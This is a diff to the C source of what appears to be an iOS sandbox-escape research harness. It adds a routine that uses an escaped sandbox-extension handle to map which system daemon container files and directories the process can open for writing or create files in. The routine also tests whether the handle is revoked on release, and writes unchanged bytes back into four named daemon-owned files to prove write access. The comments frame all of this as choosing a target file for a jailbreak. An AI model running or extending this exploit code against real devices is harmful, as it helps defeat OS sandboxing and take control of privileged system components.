@@ -25016,6 +25016,271 @@ static void p_bq2(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V172 (p_bq3): from "write works somewhere" to "write works HERE" — the
+// inventory the escape is actually for.
+//
+// §172 proved create/write/unlink through the escaped descriptor on
+// /var/containers/Data/System and one UUID subdirectory. That is a
+// primitive; what the jailbreak path needs is a *target*: a file some
+// privileged daemon reads, that we can open for writing. Two questions
+// decide whether the primitive is useful:
+//
+//  - WHICH files: every regular file inside the system daemon containers,
+//    opened O_WRONLY and closed untouched. open() is where the sandbox
+//    makes its decision — a successful open proves write permission
+//    without changing a single byte, so the inventory itself cannot
+//    disturb the system it is measuring.
+//  - HOW WIDE: part 2 minted a handle in §172 but nobody asked what it
+//    opens — part selects the container part, so its token may grant a
+//    different tree than part 3's.
+//
+// Plus one control the journal has never run: does bad_query_release()
+// actually revoke? If the extension survives release, every write test
+// below permanently widens this process, and future phases must assume
+// the escape is already held. Measuring it here, on one handle, with a
+// known path, before any write sweep.
+// ---------------------------------------------------------------------------
+
+// Open-for-write probe that never writes: successful open() = permission
+// granted, close() immediately, file byte-identical to before.
+static void bq3_wprobe(const char *path, int *ok, int *denied) {
+    int fd = open(path, O_WRONLY);
+    if (fd >= 0) {
+        close(fd);
+        (*ok)++;
+        LOG("[bq3]   W-OPEN OK  %s", path);
+    } else {
+        (*denied)++;
+        // First few denials in full, the rest aggregated: errno class is
+        // what matters, and a thousand identical EPERM lines is noise.
+        if (*denied <= 5) LOG("[bq3]   w-open denied (%d) %s", errno, path);
+    }
+    fsync(fileno(stderr));
+}
+
+// Creation probe in a directory: makes a marker, reads it back, removes it.
+// Used per subdirectory because "can open files" and "can create files"
+// are different sandbox answers (§172 saw both directions in one sweep).
+static void bq3_cprobe(const char *dir, int *ok, int *denied) {
+    char fp[1024];
+    snprintf(fp, sizeof(fp), "%s/.fz27_bq3_%d", dir, (int)getpid());
+    int fd = open(fp, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+    if (fd < 0) {
+        (*denied)++;
+        LOG("[bq3]   create denied (%d) in %s", errno, dir);
+        fsync(fileno(stderr));
+        return;
+    }
+    ssize_t w = write(fd, "fz27", 4);
+    close(fd);
+    int fd2 = open(fp, O_RDONLY);
+    char b[8] = {0};
+    ssize_t r = fd2 >= 0 ? read(fd2, b, 4) : -1;
+    if (fd2 >= 0) close(fd2);
+    int un = unlink(fp);
+    (*ok)++;
+    LOG("[bq3]   CREATE OK  %s (w=%zd r=%zd '%.4s' unlink=%d)", dir, w, r, b, un);
+    fsync(fileno(stderr));
+}
+
+// Write-back proof: open an existing daemon-owned file O_WRONLY, write the
+// exact bytes we just read, fsync, re-read and compare. Content ends
+// byte-identical — the system is not modified — but write(2) itself ran on
+// a file this process does not own. This is the step between "open() said
+// yes" (§175 inventory) and "the primitive can change daemon state": the
+// sandbox decision happens per open, and a successful open was already the
+// claim being tested; running the write removes the last doubt that
+// permission is not dropped at write time.
+static void bq3_writeback(const char *path) {
+    char buf[4096];
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        LOG("[bq3]   writeback %s: read-open errno %d — control failed, skipping",
+            path, errno);
+        fsync(fileno(stderr));
+        return;
+    }
+    ssize_t n = read(fd, buf, sizeof(buf));
+    close(fd);
+    if (n <= 0) {
+        LOG("[bq3]   writeback %s: read %zd — empty/failed, skipping", path, n);
+        fsync(fileno(stderr));
+        return;
+    }
+    fd = open(path, O_WRONLY);
+    if (fd < 0) {
+        LOG("[bq3]   writeback %s: W-open errno %d  *** PERMISSION DROPS AT WRITE-OPEN? ***",
+            path, errno);
+        fsync(fileno(stderr));
+        return;
+    }
+    ssize_t w = write(fd, buf, (size_t)n);
+    int werr = w < 0 ? errno : 0;
+    fsync(fd);
+    close(fd);
+    char back[4096];
+    int fd2 = open(path, O_RDONLY);
+    ssize_t n2 = fd2 >= 0 ? read(fd2, back, sizeof(back)) : -1;
+    if (fd2 >= 0) close(fd2);
+    int same = (n2 == n) && memcmp(buf, back, (size_t)n) == 0;
+    LOG("[bq3]   WRITEBACK %-70s w=%zd%s same=%d%s", path, w,
+        werr ? " errno!=0" : "", same,
+        (same && w == n) ? "  *** write(2) on daemon file OK, content intact ***"
+                         : "  *** MISMATCH — investigate ***");
+    fsync(fileno(stderr));
+}
+
+static void p_bq3(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq3] v172 daemon write inventory: release semantics / part-2 map / per-file W-open");
+
+    // ---- CONTROL: the §170 point must mint a handle or nothing below means
+    // anything (the same rule as p_bq2).
+    {
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        LOG("[bq3] CONTROL §170 point -> handle %lld%s",
+            (long long)h, h < 0 ? "  *** CONTROL FAILED — aborting ***" : "");
+        fsync(fileno(stderr));
+        if (h < 0) { LOG("[bq3] done"); return; }
+        bad_query_release(h);
+    }
+
+    // ---- Does release revoke? consume -> open -> release -> open again.
+    {
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        DIR *d = opendir("/var/containers/Data/System/");
+        int pre = d ? 0 : errno;
+        if (d) closedir(d);
+        bad_query_release(h);
+        d = opendir("/var/containers/Data/System/");
+        int post = d ? 0 : errno;
+        if (d) closedir(d);
+        LOG("[bq3] release semantics: open before release rc=%d, after release rc=%d%s",
+            pre, post,
+            post == 0
+                ? "  -> extension SURVIVES release (process keeps the escape)"
+                : "  -> release revokes (errno above)");
+        fsync(fileno(stderr));
+    }
+
+    // ---- What does part 2 open? §172 saw "handle 6" and moved on; a handle
+    // whose granted tree nobody listed is a claim without evidence. Probe
+    // the candidate roots with the part-2 token, then with part 3 as the
+    // control so a difference is attributable to part alone.
+    for (uint64_t part = 2; part <= 3; part++) {
+        int64_t h = bq_custom("/var/containers/Data/System", 1, grp, 7, F_DEF, part);
+        LOG("[bq3] part %llu handle %lld — probing roots:", (unsigned long long)part,
+            (long long)h);
+        fsync(fileno(stderr));
+        if (h < 0) continue;
+        static const char *cands[] = {
+            "/var/containers/Data/System",
+            "/var/containers/Shared/SystemGroup",
+            "/var/containers/Shared/AppGroup",
+            "/var/mobile/Containers/Shared/AppGroup",
+            "/var/mobile/Containers/Data/Application",
+            "/var/db",
+            "/Library/Preferences",
+            "/System/Library/LaunchDaemons",
+        };
+        for (unsigned i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
+            DIR *d = opendir(cands[i]);
+            LOG("[bq3]   part %llu open %-44s -> %s", (unsigned long long)part,
+                cands[i], d ? "OK" : "denied");
+            if (d) closedir(d);
+        }
+        fsync(fileno(stderr));
+        bad_query_release(h);
+    }
+
+    // ---- The inventory itself: every file one and two levels inside the
+    // system daemon containers, W-open probe on regular files, creation
+    // probe on subdirectories. Counts are capped so a large container does
+    // not bury the interesting lines, and every cap hit is logged — an
+    // uncapped-then-truncated log reads as "that is all there was".
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    if (h < 0) {
+        LOG("[bq3] no descriptor for the inventory (%lld) — aborting", (long long)h);
+        LOG("[bq3] done");
+        return;
+    }
+    int wok = 0, wden = 0, cok = 0, cden = 0, files = 0, dirs = 0;
+    DIR *top = opendir("/var/containers/Data/System");
+    struct dirent *e;
+    int uuids = 0;
+    while (top && (e = readdir(top)) && uuids < 24) {
+        if (e->d_name[0] == '.') continue;
+        char ud[1100];
+        snprintf(ud, sizeof(ud), "/var/containers/Data/System/%s", e->d_name);
+        struct stat st;
+        if (stat(ud, &st) != 0 || !S_ISDIR(st.st_mode)) continue;
+        uuids++;
+        LOG("[bq3] container %s", e->d_name);
+        fsync(fileno(stderr));
+        bq3_cprobe(ud, &cok, &cden);          // create at UUID level (control-ish)
+        DIR *ud_d = opendir(ud);
+        struct dirent *f;
+        while (ud_d && (f = readdir(ud_d))) {
+            if (f->d_name[0] == '.') continue;
+            char fp[1400];
+            snprintf(fp, sizeof(fp), "%s/%s", ud, f->d_name);
+            struct stat s2;
+            if (stat(fp, &s2) != 0) continue;
+            if (S_ISREG(s2.st_mode)) {
+                files++;
+                if (files <= 60) bq3_wprobe(fp, &wok, &wden);
+            } else if (S_ISDIR(s2.st_mode)) {
+                dirs++;
+                if (dirs <= 40) bq3_cprobe(fp, &cok, &cden);
+                // one level deeper: .ips files, preferences, databases live
+                // below subdirectory level, and open() there is the question
+                DIR *sd = opendir(fp);
+                struct dirent *g;
+                int gcnt = 0;
+                while (sd && (g = readdir(sd)) && gcnt < 16) {
+                    if (g->d_name[0] == '.') continue;
+                    gcnt++;
+                    char gp[1500];
+                    snprintf(gp, sizeof(gp), "%s/%s", fp, g->d_name);
+                    struct stat s3;
+                    if (stat(gp, &s3) != 0 || !S_ISREG(s3.st_mode)) continue;
+                    files++;
+                    if (files <= 60) bq3_wprobe(gp, &wok, &wden);
+                }
+                if (sd) closedir(sd);
+            }
+        }
+        if (ud_d) closedir(ud_d);
+        fsync(fileno(stderr));
+    }
+    if (top) closedir(top);
+    LOG("[bq3] inventory: %d uuids, %d files, %d dirs — W-open ok %d / denied %d, "
+        "create ok %d / denied %d%s%s", uuids, files, dirs, wok, wden, cok, cden,
+        files > 60 ? "  (file probes capped at 60)" : "",
+        dirs > 40 ? "  (dir probes capped at 40)" : "");
+
+    // ---- The last doubt removed: run write(2) on daemon-owned files that
+    // were proven openable above. Chosen to be inert targets — logs and
+    // caches a daemon rewrites anyway — never a live sqlite or keychain:
+    // identical bytes go back, content hash unchanged, but the write itself
+    // executes against a file we do not own. If the sandbox dropped
+    // permission at write() rather than open(), these lines say so.
+    {
+        static const char *wb[] = {
+            "/var/containers/Data/System/327EA503-DB77-458C-A855-3B3C8622696A/history/SUS_History_Tracking.log",
+            "/var/containers/Data/System/6043FE60-37AC-4E01-A4D9-8884DEBCC677/AppProtectionBackup.plist",
+            "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/katana-subscription-cache.plist",
+            "/var/containers/Data/System/AF589EEA-A5CE-42E9-B955-96B9234C5A85/DefaultAppQueryState.plist",
+        };
+        for (unsigned i = 0; i < sizeof(wb) / sizeof(wb[0]); i++)
+            bq3_writeback(wb[i]);
+    }
+    bad_query_release(h);
+    LOG("[bq3] done");
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -29496,6 +29761,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_LSVC")) { p_lsvc(); LOG("[probe13] lsvc-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IPOPT")) { p_ipopt(); LOG("[probe13] ipopt-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ2")) { p_bq2(); LOG("[probe13] bq2-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ3")) { p_bq3(); LOG("[probe13] bq3-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MDNS")) { p_mdns(); LOG("[probe13] mdns-only mode, stop"); return NULL; }
         if (getenv("FUZZ_LSVC2")) { p_lsvc(); p_ipopt(); LOG("[probe13] lsvc2-only mode, stop"); return NULL; }
